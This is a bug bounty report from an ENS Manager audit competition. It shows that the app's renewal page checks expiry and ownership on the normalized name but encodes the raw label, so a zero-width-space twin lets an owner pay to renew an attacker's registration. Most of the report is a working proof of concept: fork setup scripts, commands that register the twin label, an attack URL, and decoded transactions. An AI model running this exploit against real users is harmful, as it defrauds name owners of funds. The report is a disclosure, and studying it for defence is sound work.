# 90883 w a critical the manager renewal flow reads one name and pays for another so a name s owner funds an attacker s registration while their own name is untouched

**Submitted on Aug 27th 2026 at 20:34:13 UTC by @gzeon for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90883
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief/Intro

`/renew/$name` in the ENS Manager decides which name it is dealing with twice, from two different sources. The expiry it displays, and the protocol and grace checks that let the page load at all, are read for `ens_normalize(routeParameter)`. The label it prices and passes to `ETHRegistrar.renew` comes from `parseName`, whose entire treatment of the input is `trim().toLowerCase()`. Any character that ENSIP-15 drops, such as U+200B, makes those the same name to the app and two different labels on chain. An attacker registers the second label, sends the owner of the first a link to it, and the Manager builds a renewal that charges the owner and extends the attacker's registration. On a Sepolia fork, driving the shipped UI end to end, the owner of `hello.eth` spent 8021939 USDC units, `hello.eth` stayed at its original expiry, and a label the attacker owns gained a year.

## Vulnerability Details

The route resolves one URL segment into two different names and then uses each of them for a different half of the job.

### Two sources of truth for one route parameter

`/renew/$name` is a root-level route with no parent guard (`apps/manager/src/routeTree.gen.ts:83-87`). Its loader calls two things on the same string:

`apps/manager/src/routes/renew/$name.tsx:19-64`, verbatim apart from the elided gates at `:30-58`:

```ts
  loader: async ({ params: { name }, context: { queryClient } }) => {
    const parsedName = parseRenewableName(name)

    if (parsedName.isErr()) {
      throw parsedName.error
    }

    const expiryData = await queryClient.ensureQueryData(
      profileExpiryQuery(name),
    )

    …

    return {
      label: parsedName.value.label,
      currentExpiry: expiryData.expiry,
    }
  },
```

* `parseRenewableName` (`apps/manager/src/features/renew/utils/renewableName.ts:25-36`) delegates to `parseName` (`apps/manager/src/features/register-v2/utils/name-parser.ts:33-82`). It trims, lowercases, rejects internal whitespace and consecutive dots, and applies a punctuation blacklist (`:11,46,73`). ENSIP-15 is never invoked. U+200B is not in the JavaScript `\s` class and not in the blacklist, so it survives into `label`.
* `profileExpiryQuery` (`apps/manager/src/features/profile/service/profileExpiry.ts:127-131`) wraps `getExpiry` (`:73-125`), which starts with `normalizeEth2LdName(name)` at `:77`. That is viem's `normalize`, which is ENSIP-15 (`apps/manager/src/features/profile/service/profileName.ts:1,14-40,62-73`). Every read after it uses `ethName.name` (`:88,94,105-106`).

The loader returns a label for one name and an expiry for another. Both go onto the provider (`apps/manager/src/features/renew/workflow/RenewalPage.tsx:13-29`, `apps/manager/src/features/renew/state/renewalUi.context.tsx:19-20,52-55`).

The gates split the same way. Protocol (`apps/manager/src/routes/renew/$name.tsx:30,40`), grace (`:44`) and expiry presence (`:56`) are evaluated against `expiryData`, which is the normalized name's. Syntax validation runs on the un-normalized string, and `canRenewV2Name` (`renewableName.ts:40-47`) mixes the two: it parses the un-normalized string and checks it against the normalized name's expiry date.

### What the page displays

* `PricingSummaryCard` (`apps/manager/src/features/renew/workflow/pricing/components/PricingSummaryCard.tsx:10-22,37-44`) prints `expiring on <currentExpiry advanced by the chosen duration>`. `currentExpiry` is the normalized name's expiry and is never re-read for the label being renewed. `apps/manager/src/features/renew/workflow/pricing/components/DurationSelector.tsx:23` and `apps/manager/src/features/renew/workflow/renewing/components/RenewalDetails.tsx:15,23-32` read the same value, and the success screen's `Expires` line comes from it too.
* `PricingDomainHeader` (`apps/manager/src/features/register-v2/workflow/pricing/components/PricingDomainHeader.tsx:7-30`) prints `${label}.eth` from the un-normalized label, and sets it as the `title` attribute at `:27`. With a code point ENSIP-15 drops, that string renders identically to the real name.
* The page shows no owner, no recipient, and no separate current-expiry figure.

### What the app signs

* The quote is taken for the un-normalized label: `getRenewPriceQueryOptions(label, …)` at `apps/manager/src/features/renew/workflow/pricing/components/ConfirmPurchase.tsx:22` into `apps/manager/src/features/renew/data/queries/renewPricing.query.ts:26-50`.
* The same label enters the machine's submission data through `startRenewal` (`apps/manager/src/features/renew/workflow/pricing/components/ConfirmPurchase.tsx:63-72`, `apps/manager/src/features/renew/state/renewalUi.machine.ts:144-159`).
* `submitRenewActor` encodes it: `encodeRenewData(input.label, …)` at `packages/transaction-manager/src/machines/registration/registration.actors.ts:1039-1100`, whose body is `label.replace('.eth', '')` then `encodeFunctionData` (`:1020-1031`). The call is `renew(string,uint64,address,bytes32)` and the label bytes go on the wire unchanged.
* The preceding ERC-20 `approve` carries the registrar and an amount, not a label (`registration.actors.ts:197-206,850-853`), and the EOA transport passes the calldata through untouched (`packages/transaction-manager/src/actors/eoa-transport.actor.ts:35-59`).
* After the transaction lands, `invalidateNameQueries` refreshes queries keyed on the un-normalized label (`renewalUi.machine.ts:161-172`), so the app re-reads the twin rather than the name it told the user about.

### The entry point is inside the app, and the app's own warning is suppressed

The Manager has a warning for renewing a name you do not own, and the same split turns it off.

`ProfileView` computes ownership from `profileOwnerQuery(name)`, which normalizes before reading (`apps/manager/src/features/profile/service/profileOwner.ts:25,56`), and passes that result together with the un-normalized `name` to the actions bar (`apps/manager/src/features/profile/components/view/ProfileView.tsx:99-101,119,226-237`, `ProfileActions.tsx:45-50,99-104`).

`ProfileRenewAction` (`apps/manager/src/features/profile/components/view/ProfileRenewAction.tsx:66-88`) then does:

```tsx
  if (shouldShowThirdPartyRenewalWarning(isOwner)) {
    return (
      <ThirdPartyRenewalDialog
        name={name}
        protocol={resolvedProtocol}
        trigger={
          <button className={className} type="button">
            {buttonContent}
          </button>
        }
      />
    )
  }

  return (
    <LinkButton
      className={className}
      params={{ name }}
      to={getRenewalRoute(resolvedProtocol)}
    >
      {buttonContent}
    </LinkButton>
  )
```

`shouldShowThirdPartyRenewalWarning` is `isOwner === false` (`apps/manager/src/features/renew/utils/thirdPartyRenewalWarning.ts:1-3`). A visitor who owns the normalized name is `isOwner === true`, so the dialog that reads "Renewing this name will add time to the *current owner's* registration. You won't gain ownership of the name, but you will make someone's day." (`apps/manager/src/features/renew/components/ThirdPartyRenewalDialog.tsx:61-70`) never opens, and the button links to `/renew/<un-normalized name>`. A direct link to `/renew/…` never reaches that dialog at all, because it lives only on the profile page.

The app will also mint the link. The share control on the same profile builds `${origin}/p/${name}` from the un-normalized name (`apps/manager/src/features/profile/components/view/ProfileView.tsx:60-65`, `ProfileShareAction.tsx:10,16,38`), and `/p/$name` redirects straight back to `/$name` (`apps/manager/src/routes/p/$name/index.tsx:4-10`). An attacker opens their own twin's profile, presses Share, and gets a first-party `app.ens.domains` URL to send.

The grace-period banner is a third link into the same route with the same value (`ProfileStatusBanners.tsx:39-44`, `apps/manager/src/features/grace/components/GracePeriodBanner.tsx:129-137`). It renders after expiry rather than before it, so it is a separate surface from the one demonstrated below.

`/renew-v1/$name` is built the same way: owner and expiry normalized (`apps/manager/src/routes/renew-v1/$name.tsx:21,36`), `isRenewable` and the calldata from the un-normalized label (`:15,50-53`, `apps/manager/src/features/renew/data/queries/v1Renewable.query.ts:18-29`). The proof of concept below exercises the v2 route only.

### Why the two labels are separately registrable

`ens_normalize` drops ignored code points rather than rejecting them, so `hel<U+200B>lo.eth` normalizes to `hello.eth`. The registrar hashes the bytes it is handed, and those bytes differ:

```
labelhash("hello")               0x1c8aff950685c2ed4bc3174f3472287b56d9517b9c948127319a09a7a36deac8
labelhash("hel" U+200B "lo")     0xe738b0a670639784de6ec8494ed1e437ae0139389ba7e8c46f6b358482f81cc8
```

Two unrelated token ids. On Sepolia at block 11570308 the registrar agrees: `isAvailable` is false for the first and true for the second, as Part A prints. Both labels sit in the five-or-more-character price tier, and both renewal pages quote `$8.02` for a year.

### What a careful user can still see

The address bar carries the code point percent-encoded as `%E2%80%8B`, and `PricingDomainHeader` sets the raw label as a `title` tooltip. A wallet that ABI-decodes `renew(string,…)` shows the label as a string argument, where U+200B is still invisible; the Manager sends the wallet only account, to, value, data, gas, nonce and chain (`registration.actors.ts:1085-1096`, `eoa-transport.actor.ts:35-59`). The origin stays the real one, and the page asserts the visitor's own ownership, so a user who notices the encoded path still has the app telling them this is their name.

## Impact Details

Selected impact: **(Websites and Applications) Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient.**

The program's overview names this class directly: "We are also concerned with the transaction-construction and smart-account/session-key paths (`packages/transaction-manager`, `packages/smart-account`): anything that lets a transaction be built, signed, or attributed with the wrong chain, sender, target address, or arguments." The label is the argument, and `encodeRenewData` is in `packages/transaction-manager`.

The incorrect transaction detail is which name is being paid for. The expiry, ownership and grace status on the page are read for `hello.eth`; the label in the `renew` calldata is the attacker's. The ERC-20 transfer still goes to the ETHRegistrar, which is why this is not filed as direct theft. The unintended recipient is the registration that receives the time: the token id the attacker owns.

Measured on the fork, driving the shipped UI:

|                   |                                                                                                                        |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------- |
| Attacker cost     | one registration of the twin label, at the same `$8.02` a year the victim is then charged                              |
| Victim paid       | 8021939 USDC units, shown on screen as `$8.02`                                                                         |
| Approval signed   | 8824132 units, the quote plus the app's 10% headroom                                                                   |
| Page said         | `Renew to date August 12, 2028`, `expiring on August 12, 2028`, then `Renewal Complete!` and `Expires August 12, 2028` |
| `hello.eth` after | expiry 2027-08-12, unchanged                                                                                           |
| Twin after        | 2027-08-26 to 2028-08-26                                                                                               |

The duration is the user's choice, and the presets go to six years at `$27.02` (visible in the page capture below), priced identically for both labels. The link does not set it; a user renewing for longer loses proportionally more.

The success screen reports `Renewal Complete!` with the normalized name's expiry advanced. That is the last thing the user sees, so the renewal they believe they made is one they did not make. Whether the real name is subsequently lost depends on whether they renew again through another route; the demonstrated loss is the payment.

Scope: any `.eth` name of five or more characters whose twin label is still unregistered, whose owner opens the link and signs. Shorter names may fall in a different price tier and would show a price that does not match. The attacker needs no privileged access, no control of an RPC, indexer or third-party service, and no interaction with the victim's session. They need to register a name and get a link in front of the owner, and the app's own Share control will produce that link for them.

## References

* `apps/manager/src/routes/renew/$name.tsx:19-64` - loader returns the un-normalized label with the normalized name's expiry
* `apps/manager/src/routeTree.gen.ts:83-87` - the route has no parent guard
* `apps/manager/src/features/renew/utils/renewableName.ts:25-36,40-47` - `parseRenewableName`, `canRenewV2Name`
* `apps/manager/src/features/register-v2/utils/name-parser.ts:11,33-82` - `trim().toLowerCase()` and the punctuation blacklist, no ENSIP-15
* `apps/manager/src/features/profile/service/profileExpiry.ts:73-125,127-131` - normalizes first, reads expiry for the normalized name
* `apps/manager/src/features/profile/service/profileName.ts:1,14-40,62-73` - `normalize` from `viem/ens`
* `apps/manager/src/features/profile/service/profileOwner.ts:25,56` - ownership also from the normalized name
* `apps/manager/src/features/renew/state/renewalUi.context.tsx:19-20,52-55` - both values on the same context
* `apps/manager/src/features/renew/workflow/pricing/components/PricingSummaryCard.tsx:10-22,37-44` - displays the normalized name's expiry
* `apps/manager/src/features/register-v2/workflow/pricing/components/PricingDomainHeader.tsx:7-30` - displays the un-normalized label
* `apps/manager/src/features/renew/data/queries/renewPricing.query.ts:26-50` - quotes the un-normalized label
* `apps/manager/src/features/renew/workflow/pricing/components/ConfirmPurchase.tsx:22,63-72` - carries it into the machine
* `apps/manager/src/features/renew/state/renewalUi.machine.ts:144-159,161-172` - `startRenewal`, and the post-success invalidation keyed on the same label
* `packages/transaction-manager/src/machines/registration/registration.actors.ts:197-206,850-853,1020-1031,1039-1100` - `encodeTokenApprovalData`, `encodeRenewData`, `submitRenewActor`
* `packages/transaction-manager/src/actors/eoa-transport.actor.ts:35-59` - calldata passed through
* `apps/manager/src/features/profile/components/view/ProfileRenewAction.tsx:66-88` - links to the route with the un-normalized name
* `apps/manager/src/features/renew/utils/thirdPartyRenewalWarning.ts:1-3` - the warning is `isOwner === false`
* `apps/manager/src/features/renew/components/ThirdPartyRenewalDialog.tsx:61-70` - the warning that does not fire
* `apps/manager/src/features/grace/components/GracePeriodBanner.tsx:129-137`, `ProfileStatusBanners.tsx:39-44` - third link into the same route
* `apps/manager/src/routes/renew-v1/$name.tsx:15,21,36,50-53`, `apps/manager/src/features/renew/data/queries/v1Renewable.query.ts:18-29` - the same shape on the v1 route
* ENSIP-15: <https://docs.ens.domains/ensip/15>

Present at `1c9b47f18fcddd2e864dfe385c4171061c9811ae`, which is the head of `audit-comp-ready` and the only branch. Every file above entered the repository at the fork commit `cda79ac` and has not been touched since, so there is no fix attempt to bypass.

### Relationship to EXP-INPUT-005

The disclosed entry is the validator gap and it covers this input class. Its text reads: "Our name validators accept inputs that ENS normalization later rejects **or transforms**, including homoglyphs, bidirectional-control and other control characters, and a single leading or trailing dot. The practical impact is homograph-style display confusion in our UI **rather than incorrect resolution**."

This is submitted under the exception the same document states: "new consequences of a listed root cause that materially change its severity" are in scope. The disclosed consequence is display confusion and it is rated Medium. The consequence here is a paid, state-changing transaction submitted for a different on-chain label than the one whose expiry and ownership the page displays, with the user's money extending a registration that is not theirs. That is incorrect resolution of which name is being bought, in a flow where the app supplies the ownership and expiry assurances that make the page trustworthy.

The Manager's name validator is `validateENSName` (`apps/manager/src/features/shared/registration/nameUtils.ts:90-142`), reached from the search box through `useCheckAvailability.ts:69` and `nameChainContractService.ts:31`. That function accepts non-normalized input, which is the disclosed gap. The renewal path never calls it: a URL opened directly goes route parameter to `parseName` to `renew` calldata without passing any validator. Tightening `validateENSName` therefore does not close this. What does is normalizing inside `parseName`, or having the route compare its parsed label against `ens_normalize(param)` and refuse a mismatch.

## Proof of Concept

Three parts: a setup script, the shipped UI driven by hand, and a readout script that decodes what the app sent. The renewal transaction in the readout is the app's own, captured from the chain, not a reconstruction.

The whole procedure, in order:

{% stepper %}
{% step %}

### Start the Sepolia fork

```bash
anvil --fork-url <your sepolia rpc> --fork-block-number 11570308 --port 8557
```

{% endstep %}

{% step %}

### Run the Part A setup script

Save the Part A block below as `partA.sh` and run it from `apps/manager`. Note the `FROM_BLOCK` and victim USDC figures it prints.
{% endstep %}

{% step %}

### Configure and start the Manager

Write `apps/manager/.env.local` with the four lines in Part B and start `pnpm dev:manager`.
{% endstep %}

{% step %}

### Complete the browser flow

Follow Part B's four UI steps in the browser.
{% endstep %}

{% step %}

### Decode the app's transactions

Save the Part C block as `partC.sh` and run it with the two figures from step 2.
{% endstep %}
{% endstepper %}

Everything needed is in this report. What you supply: Foundry (`anvil` and `cast`, tested on 1.7.1), Node 22 with pnpm 10, a Sepolia RPC URL of your own for the fork, and the repository at `1c9b47f`. No files are attached and nothing is fetched from elsewhere. The only file written outside the scripts is `apps/manager/.env.local`, whose full contents are below; it is matched by `apps/manager/.gitignore:5`, so the checkout stays clean.

### Local-fork substitutions, and what they stand in for

| In the script                                                   | What a live attack needs                                                                                                                                                                                                                                                                                          |
| --------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `anvil_setCode <attacker> 0x`                                   | A plain EOA. Anvil's default keys carry a stray EIP-7702 delegation on Sepolia that reverts the ERC-1155 receiver hook on `register`                                                                                                                                                                              |
| `mint` on MockUSDC, to attacker and victim                      | Both parties hold USDC of their own                                                                                                                                                                                                                                                                               |
| `evm_increaseTime 120`                                          | Wait out the registrar's 60-second commitment cooldown                                                                                                                                                                                                                                                            |
| `anvil_impersonateAccount` and `anvil_setBalance` on the victim | The victim signs in their own wallet and pays their own gas                                                                                                                                                                                                                                                       |
| `VITE_USE_MOCK_WALLET` / `VITE_MOCK_ACCOUNT`                    | The repository's own automation connector (`apps/manager/src/lib/mockWallet.mock.ts:4-34`), which forwards `eth_sendTransaction` to the chain's RPC as raw JSON-RPC. It only decides which address is connected. Ownership still comes from `profileOwnerQuery`, and the calldata in Part C is what the app built |
| `VITE_FF_USE_EOA=true`                                          | Avoids needing Rhinestone infrastructure on a fork. Renewal is a direct wallet transaction on both paths (`renewalUi.machine.ts:22-23`)                                                                                                                                                                           |
| `VITE_SEPOLIA_RPC_URL`                                          | Nothing. The victim's browser uses the deployment's endpoint (`apps/manager/src/lib/wagmi.ts:21-25`)                                                                                                                                                                                                              |

No transaction is broadcast to a public network. Anvil reads public Sepolia state through the fork URL; every write lands on the local node.

### Part A: set up the fork

Run this from `apps/manager` so the one `node` line resolves `viem/ens`, the module the app itself imports.

```bash
#!/usr/bin/env bash
set -euo pipefail
RPC=http://127.0.0.1:${PORT:-8557}

UR=0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe        # UniversalResolver
REGISTRAR=0xa88553F454b77203B0D036A05c894d555EAAa2Cc  # ETHRegistrar (v2)
REGISTRY=0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2   # PermissionedRegistry (.eth)
USDC=0x768F42455A2D082E23ceeF7d51e5787C82d67a39
ZERO=0x0000000000000000000000000000000000000000
ZERO32=0x0000000000000000000000000000000000000000000000000000000000000000
SECRET=0x4444444444444444444444444444444444444444444444444444444444444444

ATTACKER=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
ATTACKER_KEY=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
VICTIM=0x1D84ad46F1ec91b4Bb3208F645aD2fA7aBEc19f8      # the real owner of hello.eth on Sepolia

TARGET=hello
TWIN=$'hel\u200blo'                              # "hel" U+200B ZERO WIDTH SPACE "lo"

dns() { python3 -c "import sys;print(''.join('%02x%s'%(len(l.encode()),l.encode().hex()) for l in sys.argv[1].split('.'))+'00')" "$1"; }
day() { python3 -c "import datetime,sys;print(datetime.datetime.utcfromtimestamp(int(sys.argv[1])).strftime('%Y-%m-%d'))" "$1"; }
expiry() { cast call $REGISTRY 'getExpiry(uint256)(uint64)' "$(cast to-dec "$(cast keccak "$1")")" --rpc-url $RPC | awk '{print $1}'; }

echo "### 0. local Sepolia fork"
cast block-number --rpc-url $RPC >/dev/null 2>&1 || { echo "ABORT: start anvil first"; exit 1; }
echo "  block $(cast block-number --rpc-url $RPC), chain id $(cast chain-id --rpc-url $RPC), clock $(day "$(cast block latest --field timestamp --rpc-url $RPC)")"

echo
echo "### 1. one URL, two names"
node --input-type=module -e "
import { normalize } from 'viem/ens'          // exactly what profileName.ts imports
const raw = process.argv[1]
const cp = s => [...s].map(c => 'U+' + c.codePointAt(0).toString(16).toUpperCase().padStart(4,'0')).join(' ')
console.log('  route parameter            ' + JSON.stringify(raw))
console.log('  its code points            ' + cp(raw.split('.')[0]))
console.log('  normalize(route parameter) ' + JSON.stringify(normalize(raw)))
" "$TWIN.eth"
echo "  isAvailable(\"$TARGET\")           $(cast call $REGISTRAR 'isAvailable(string)(bool)' "$TARGET" --rpc-url $RPC)"
echo "  isAvailable(twin)          $(cast call $REGISTRAR 'isAvailable(string)(bool)' "$TWIN" --rpc-url $RPC)"

echo
echo "### 2. the attacker registers the twin through the real ETHRegistrar"
cast rpc anvil_setCode $ATTACKER 0x --rpc-url $RPC >/dev/null
cast send $USDC "mint(address,uint256)" $ATTACKER 100000000 --private-key $ATTACKER_KEY --rpc-url $RPC >/dev/null
C=$(cast call $REGISTRAR "makeCommitment(string,address,bytes32,address,address,uint64,bytes32)(bytes32)" "$TWIN" $ATTACKER $SECRET $ZERO $ZERO 31536000 $ZERO32 --rpc-url $RPC)
cast send $REGISTRAR "commit(bytes32)" "$C" --private-key $ATTACKER_KEY --rpc-url $RPC >/dev/null
cast rpc evm_increaseTime 120 --rpc-url $RPC >/dev/null; cast rpc evm_mine --rpc-url $RPC >/dev/null
cast send $USDC "approve(address,uint256)" $REGISTRAR 100000000 --private-key $ATTACKER_KEY --rpc-url $RPC >/dev/null
cast send $REGISTRAR "register(string,address,bytes32,address,address,uint64,address,bytes32)" "$TWIN" $ATTACKER $SECRET $ZERO $ZERO 31536000 $USDC $ZERO32 --private-key $ATTACKER_KEY --rpc-url $RPC >/dev/null
echo "  owner of $TARGET.eth         $(cast call $UR 'findOwner(bytes)(address)' "0x$(dns "$TARGET.eth")" --rpc-url $RPC)"
echo "  owner of the twin          $(cast call $UR 'findOwner(bytes)(address)' "0x$(dns "$TWIN.eth")" --rpc-url $RPC)"

echo
echo "### 3. state before the victim opens the link"
cast rpc anvil_impersonateAccount $VICTIM --rpc-url $RPC >/dev/null
cast rpc anvil_setBalance $VICTIM 0xde0b6b3a7640000 --rpc-url $RPC >/dev/null
cast send $USDC "mint(address,uint256)" $VICTIM 100000000 --private-key $ATTACKER_KEY --rpc-url $RPC >/dev/null
echo "  $TARGET.eth expires          $(day "$(expiry "$TARGET")")"
echo "  the twin expires           $(day "$(expiry "$TWIN")")"
echo "  victim USDC                $(cast call $USDC 'balanceOf(address)(uint256)' $VICTIM --rpc-url $RPC | awk '{print $1}') units"
echo "  FROM_BLOCK                 $(cast block-number --rpc-url $RPC)"
```

Output:

```
### 0. local Sepolia fork
  block 11570308, chain id 11155111, clock 2026-08-26

### 1. one URL, two names
  route parameter            "hel​lo.eth"
  its code points            U+0068 U+0065 U+006C U+200B U+006C U+006F
  normalize(route parameter) "hello.eth"
  isAvailable("hello")           false
  isAvailable(twin)          true

### 2. the attacker registers the twin through the real ETHRegistrar
  owner of hello.eth         0x1D84ad46F1ec91b4Bb3208F645aD2fA7aBEc19f8
  owner of the twin          0x70997970C51812dc3A010C7d01b50e0d17dc79C8

### 3. state before the victim opens the link
  hello.eth expires          2027-08-12
  the twin expires           2027-08-26
  victim USDC                901631222 units
  FROM_BLOCK                 11570314
```

### Part B: the victim uses the shipped UI

Create `apps/manager/.env.local`:

```dotenv
VITE_SEPOLIA_RPC_URL=http://127.0.0.1:8557
VITE_USE_MOCK_WALLET=true
VITE_MOCK_ACCOUNT=0x1D84ad46F1ec91b4Bb3208F645aD2fA7aBEc19f8
VITE_FF_USE_EOA=true
```

Start the Manager:

```bash
pnpm dev:manager
```

{% stepper %}
{% step %}

### Open the renewal URL

Open `http://localhost:3000/renew/hel%E2%80%8Blo.eth`.

The wallet slot already holds `hello.eth`'s owner, so the app opens a "Verify your wallet" SIWE prompt; dismiss it with `Skip for now` and then `Skip Anyway`. It signs nothing and is unrelated to the renewal.

`document.body.innerText` for the page underneath:

```
hel​lo.eth
Starter
Try it out
1 year
$8.02/year
$8.02
base price
Committed
Make it yours
3 years
$5.51/year
$16.52
base price
Most popular
Long-term identity
Best yearly price
6 years
$4.50/year
$27.02
base price
Renew to date
August 12, 2028
calendar_month
Renewing for
1 year
expiring on
August 12, 2028

TOTAL

$
8
.
0
2
USD
Save 
$
0
.
0
0

Stables accepted

PAY WITH STABLECOINS
-
TanStack Router
```

The trailing `-` and `TanStack Router` are the dev server's router devtools overlay, not app content.

`August 12, 2028` is `hello.eth`'s expiry plus the chosen duration. The twin expires August 26, 2027.

Opening `/renew/hello.eth` on the same fork and taking the same extract gives a string of 400 characters against the twin's 401. Deleting the single U+200B from the twin's extract makes the two byte-identical: same header, same `$8.02`, same `$27.02` six-year preset, same `Renew to date August 12, 2028`. The pages are the same to the pixel, and one of them renews someone else's name.
{% endstep %}

{% step %}

### Choose the payment token

Click `PAY WITH STABLECOINS`. The token picker opens:

```
Select coin
hel​lo.eth
Select payment
S

USDC

$901.63

available

Stables accepted

Total

$8.02

USD
RENEW NAME
Close
```

{% endstep %}

{% step %}

### Confirm the purchase

Click the `USDC` row, then `RENEW NAME`. The confirmation reads:

```
Confirm purchase
Renewing
hel​lo.eth
for
$8.02
USDC
RENEW NAME
Close
```

{% endstep %}

{% step %}

### Submit the renewal

Click `RENEW NAME`. The mock connector forwards the wallet request to the fork as raw JSON-RPC, the two transactions land, and the final screen reads:

```
Renewal Complete!

The ENS domain has been successfully renewed.

hel​lo.eth

Renewal Details

Renewal Period

1 year

Renewal Fee

$8.02

Total Paid

$8.02

Expires

August 12, 2028

Back to profile
-
TanStack Router
```

{% endstep %}
{% endstepper %}

### Part C: decode what the app sent

```bash
#!/usr/bin/env bash
set -euo pipefail
RPC=http://127.0.0.1:${PORT:-8557}
REGISTRY=0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
USDC=0x768F42455A2D082E23ceeF7d51e5787C82d67a39
VICTIM=0x1D84ad46F1ec91b4Bb3208F645aD2fA7aBEc19f8
TARGET=hello
TWIN=$'hel\u200blo'
: "${FROM_BLOCK:?run part A first and pass its FROM_BLOCK}"
: "${USDC_BEFORE:?pass the victim USDC balance part A printed}"

day() { python3 -c "import datetime,sys;print(datetime.datetime.utcfromtimestamp(int(sys.argv[1])).strftime('%Y-%m-%d'))" "$1"; }
expiry() { cast call $REGISTRY 'getExpiry(uint256)(uint64)' "$(cast to-dec "$(cast keccak "$1")")" --rpc-url $RPC | awk '{print $1}'; }

echo "### 5. every transaction the Manager itself sent"
for b in $(seq $((FROM_BLOCK + 1)) "$(cast block-number --rpc-url $RPC)"); do
  for t in $(cast block "$b" --json --rpc-url $RPC | python3 -c 'import json,sys;print(" ".join(json.load(sys.stdin)["transactions"]))'); do
    [ -z "$t" ] && continue
    IN=$(cast tx "$t" input --rpc-url $RPC)
    echo "  from $(cast tx "$t" from --rpc-url $RPC)  to $(cast tx "$t" to --rpc-url $RPC)"
    case "${IN:0:10}" in
      0x095ea7b3) echo "    approve(address,uint256)"; cast decode-calldata "approve(address,uint256)" "$IN" | sed 's/^/      /' ;;
      0x89d779c3) echo "    renew(string,uint64,address,bytes32)"; cast decode-calldata "renew(string,uint64,address,bytes32)" "$IN" | sed 's/^/      /' ;;
      *)          echo "    selector ${IN:0:10}" ;;
    esac
  done
done

echo
echo "### 6. state after"
USDC_AFTER=$(cast call $USDC 'balanceOf(address)(uint256)' $VICTIM --rpc-url $RPC | awk '{print $1}')
echo "  victim USDC spent          $((USDC_BEFORE - USDC_AFTER)) units"
echo "  $TARGET.eth expires          $(day "$(expiry "$TARGET")")   unchanged"
echo "  the twin expires           $(day "$(expiry "$TWIN")")   extended, and the twin belongs to the attacker"
```

```bash
FROM_BLOCK=11570314 USDC_BEFORE=901631222 bash partC.sh
```

Output:

```
### 5. every transaction the Manager itself sent
  from 0x1D84ad46F1ec91b4Bb3208F645aD2fA7aBEc19f8  to 0x768F42455A2D082E23ceeF7d51e5787C82d67a39
    approve(address,uint256)
      0xa88553F454b77203B0D036A05c894d555EAAa2Cc
      8824132 [8.824e6]
  from 0x1D84ad46F1ec91b4Bb3208F645aD2fA7aBEc19f8  to 0xa88553F454b77203B0D036A05c894d555EAAa2Cc
    renew(string,uint64,address,bytes32)
      "hel\u{200b}lo"
      31622400 [3.162e7]
      0x768F42455A2D082E23ceeF7d51e5787C82d67a39
      0x0000000000000000000000000000000000000000000000000000000000000000

### 6. state after
  victim USDC spent          8021939 units
  hello.eth expires          2027-08-12   unchanged
  the twin expires           2028-08-26   extended, and the twin belongs to the attacker
```

`cast` prints the label the Manager put in its own calldata as `"hel\u{200b}lo"`. The duration, 31622400 seconds, is the app's calendar year (`apps/manager/src/features/register-v2/utils/time.ts:26-38`), and `8824132` is the quote plus the app's 10% approval headroom, both produced by the app rather than by this script.

### The same page with the owner connected

With the same environment, open `http://localhost:3000/hel%E2%80%8Blo.eth`. `document.body.innerText` and the renewal links on the page:

```
dehaze
search
happi1337.eth
keyboard_arrow_down
hel​lo.eth
key_vertical
Owner
happi1337.eth
calendar_clock
Registered
AUG.12.2026
history
Expires
AUG.12.2027
About
RENEW NAME
double_arrow
favorite
ios_share
EDIT PROFILE
-
TanStack Router

renew links on this page:
  <a href="/renew/hel%E2%80%8Blo.eth">RENEW NAME</a>
  <a href="/renew/hel%E2%80%8Blo.eth">Renew Namedouble_arrow</a>
```

`happi1337.eth` is the connected wallet's own primary name, printed as this name's owner. The registration and expiry dates are `hello.eth`'s. `EDIT PROFILE` is the owner-only control (`ProfileActions.tsx:107-122`, `ProfileEditAction.tsx:35-50`), so the app has classified the visitor as this name's owner, which is why `RENEW NAME` is an enabled link rather than the third-party dialog. Both links point at the twin. Record values on this page come from the un-normalized name rather than the normalized one, which is a separate defect in the same split and is not part of this report.
